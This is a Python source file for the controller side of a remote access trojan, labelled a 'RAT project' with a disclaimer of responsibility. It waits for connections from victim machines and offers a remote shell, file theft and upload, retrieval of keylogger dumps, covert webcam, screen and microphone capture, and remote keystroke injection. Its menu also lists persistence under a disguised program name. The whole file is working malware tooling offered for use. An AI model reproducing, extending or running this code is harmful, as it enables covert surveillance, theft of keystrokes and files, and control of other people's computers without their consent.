# Python RAT project by average-joe44
# Does NOT Responsible for any use case!

import socket
import json
import os
import struct
import pickle
import cv2
import wave
import pyaudio
import sys

try:
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.bind(('0.0.0.0', 9999))
    print('Waiting for connection')
    soc.listen(1)
    koneksi = soc.accept()
    _target = koneksi[0]
    ip = koneksi[1]
    print(f'Connected to {str(ip)}')
except KeyboardInterrupt:
    print('exiting listener')
    sys.exit()

def recv_keylog():
    try:
        _target.settimeout(7)
        print("Dumping logs:")
        data = _target.recv(1024).decode()
        print(data)
    except socket.timeout:
        print("No dump received, continuing")

def start_image_server(host="0.0.0.0", port=9993, save_as="hasil.jpg"):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.settimeout(23)
        server.bind((host, port))
        server.listen(1)

        print("connecting")
        conn, addr = server.accept()
        print(f"connected {addr}")

        size_data = conn.recv(4)
        size = struct.unpack("!I", size_data)[0]

        data = b""
        while len(data) < size:
            packet = conn.recv(4096)
            if not packet:
                break
            data += packet

        with open(save_as, "wb") as f:
            f.write(data)

        print(f'saved as {save_as}')

        conn.close()
        server.close()
    except socket.timeout:
        print("Can't access camera")


def keystroke():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('0.0.0.0', 9995))
        s.listen(1)
        print('Connect')
        conn, addr= s.accept()
        with conn:
            print('connected {addr}')
            while True:
                    command = input('text: ')
                    conn.sendall(command.encode())
                    break
    print('send')

FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100
CHUNK = 1024

def receive_and_save(WAVE_OUTPUT):
    frames = []
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(('0.0.0.0', 9996))
            s.listen(1)
            conn, addr = s.accept()
            with conn:
                    print(f'connect {addr}')
                    while True:
                        data = conn.recv(CHUNK)
                        if not data:
                            break
                        frames.append(data)
        print('saving WAV file')
        with wave.open(WAVE_OUTPUT, 'wb') as wf:
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(2)
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
        print(f'{WAVE_OUTPUT}')
    except socket.error as e:
        print(f'{e}')

def screen_record(host="0.0.0.0", port=9999):
    MAX_WIDTH = 960
    MAX_HEIGHT = 540
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(1)

    print("connecting")
    conn, addr = server.accept()
    print(f"connected {addr}") 

    data = b""
    payload_size = struct.calcsize("Q")

    cv2.namedWindow('Screen Share | Q / ESC = Quit', cv2.WINDOW_NORMAL)
    cv2.resizeWindow('Screen Share | Q / ESC = Quit', MAX_WIDTH, MAX_HEIGHT)

    while True:
        try:
            while len(data) < payload_size:
                packet = conn.recv(4096)
                if not packet:
                    return 
                data += packet

            packed_size = data[:payload_size]
            data = data[payload_size:]
            frame_size = struct.unpack("Q", packed_size)[0]

            while len(data) < frame_size:
                data += conn.recv(4096)

            frame_data = data[:frame_size]
            data = data[frame_size:]

            frame = pickle.loads(frame_data)
            frame = cv2.resize(frame, (MAX_WIDTH, MAX_HEIGHT))
            
            cv2.imshow("Screen Share | Q / ESC = Quit", frame)

            key = cv2.waitKey(1) & 0xFF
            if key == ord('q') or key == 27:
                print("stoped")
                break

        except Exception as e:
            print("error", e)
            break

    conn.close()
    cv2.destroyAllWindows()


def konversi_byte_stream():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('0.0.0.0', 9998))
    sock.listen(1)
    konek = sock.accept()
    tg = konek[0]
    ip = konek[1]
    print(f'connected {ip}')
    bdata = b""
    payload_size = struct.calcsize("Q")
    try:
        while True:
                while(len(bdata)) < payload_size:
                    packet = tg.recv(4*1024)
                    if not packet: break
                    bdata += packet
                packed_msg_size = bdata[:payload_size]
                bdata = bdata[payload_size:]
                msg_size = struct.unpack("Q", packed_msg_size)[0]
                while len(bdata) < msg_size:
                    bdata += tg.recv(4*1024)
                frame_data = bdata[:msg_size]
                bdata =  bdata[msg_size:]
                frame = pickle.loads(frame_data)
                cv2.startWindowThread()
                cv2.imshow("streaming / press Q to quit", frame)
                key = cv2.waitKey(1)
                if key & 0xFF == ord('q'):
                    break 
        tg.close()
        cv2.destroyAllWindows()
    except:
        print("Can't access camera")

def upload_file(namafile):
    bufsize = 65536
    if not os.path.exists(namafile):
        _target.sendall(struct.pack("Q", 0))
        print('file not found')
        return
    if os.path.isdir(namafile):
        _target.sendall(struct.pack("Q", 0))
        print(f'{namafile} is a directory')
        return
    filesize = os.path.getsize(namafile)
    _target.sendall(struct.pack("Q", filesize))
    with open(namafile, 'rb') as f:
        print('uploading')
        while True:
            data = f.read(bufsize)
            if not data:
                break
            _target.sendall(data)
            print(f'{f.tell()}/{filesize} bytes ({f.tell()/filesize*100:.2f}%)', end='\r')
        print('\nuploaded')  

def download_file(namafile):
    bufsize = 65536
    size_data = _target.recv(8)
    filesize = struct.unpack("Q", size_data)[0]
    if filesize == 0:
        print('file not found')
        return 
    recv = 0
    with open(namafile, 'wb') as file:
        print('downloading')
        while recv < filesize:
                data = _target.recv(bufsize)
                if not data:
                    break
                file.write(data)
                recv += len(data)
                print(f'{recv}/{filesize} bytes ({recv/filesize*100:.2f})', end='\r')
        print('\ndownloaded')

def data_diterima():
        data = ''
        while True:
            try:
                data = data + _target.recv(1024).decode().rstrip()
                return json.loads(data)
            except ValueError:
                 continue

def shellc():
    x = 0                      
    n = 0
    p = 0
    print("Type 'help' for help")
    while True:
        try:
            perintah = input('shell>> ')
            data = json.dumps(perintah)
            _target.send(data.encode())
            if perintah in('exit','quit'):
                exit('Exiting')
            elif perintah == 'clear':
                os.system('clear')
            elif perintah[:3] == 'cd ':
                pass
            elif perintah[:8] == 'download':
                download_file(perintah[9:])
            elif perintah[:6] == 'upload':
                upload_file(perintah[7:])
            elif perintah == 'start_log':
                print('starting keylogger')
                pass
            elif perintah == 'baca_log':
                recv_keylog()
            elif perintah == 'clear_log':
                pass  
            elif perintah == 'stop_log':
                print('stoping keylogger')
                pass
            elif perintah == 'start_cam':
                konversi_byte_stream()
            elif perintah ==  'screen_shot':
                n += 1
                download_file("ss"+str(n)+".png")
            elif perintah == 'screen_share':
                screen_record(host='0.0.0.0', port=9991) 
            elif perintah == 'help':
                print("""
                    
                        basic command:
                    ================================
                    -exit/quit >> exit
                    
                    -clear     >> clear terminal
                    ================================

                        file transfer command:
                    ================================
                    -download  >> download file

                    -upload    >> upload file
                    ================================

                        keylogging:
                    ================================
                    -start_log >> start keylogger

                    -baca_log  >> read keylogger

                    -clear_log >> delet log from keylogger

                    -stop_log  >> stop keylogger
                    ================================

                        camera command:
                    ================================                   
                    -start_cam >> access camera

                    -snap_cam  >> snap camera
                    ================================

                        screen command:
                    ================================
                    -screen_shot >> screen shot

                    -screen_share >> screen sharing
                    ================================

                        maintain access:
                    ================================ 
                    -persistence >> run persistence
                    example:    persistence winsec manager.exe
                    =================================

                        mic, keys command:
                    ================================
                    -rec_audio >> record audio for 20 second
                    
                    -send_key  >> type keyboard remotely
                    ================================ 

                        execution:
                    ================================
                    -execute    >> start program

                    -kill       >> kill program
                    ================================
                    
                    """)
            elif perintah == 'rec_audio':
                p += 1
                receive_and_save('retrieved_audio'+str(p)+'.wav')
            elif perintah == 'send_key':
                keystroke()   
            elif perintah == 'snap_cam':
                x += 1
                start_image_server(save_as='webcam'+str(x)+'.jpg') 
            elif perintah[:7] == 'execute':
                pass  
            elif perintah[:4] == 'kill':
                pass  
            else:
                hasil = data_diterima()
                print(hasil)
        except ConnectionResetError:
            print('Connection closed')
            break  
        except BrokenPipeError:
            print("Broken Pipe error")
            break
        except ConnectionRefusedError:
            print("Connection refused")
            break
        except ConnectionError:
            print("Connection error")
            break
        except ConnectionAbortedError:
            print("Connection aborted")
            break        
        except KeyboardInterrupt:
            print("\n")
            pass
shellc()
